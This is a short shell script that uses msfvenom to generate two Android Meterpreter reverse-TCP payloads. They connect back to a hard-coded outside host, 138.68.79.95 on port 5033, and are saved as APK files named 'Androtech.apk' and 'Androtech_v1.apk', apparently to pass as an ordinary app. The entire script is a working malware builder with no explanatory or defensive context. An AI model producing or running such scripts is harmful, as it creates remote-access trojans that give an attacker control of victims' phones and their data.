#!/usr/bin/sh
clear
cd
echo " Creating the payload "
echo " "
msfvenom --platform android --arch dalvik -p android/meterpreter/reverse_tcp LHOST=138.68.79.95 LPORT=5033 -f raw -o /root/bot/app/Androtech.apk
sleep 4
clear
msfvenom --platform android --arch dalvik -p android/meterpreter_reverse_tcp LHOST=138.68.79.95 LPORT=5033 -f raw -o /root/bot/app/Androtech_v1.apk
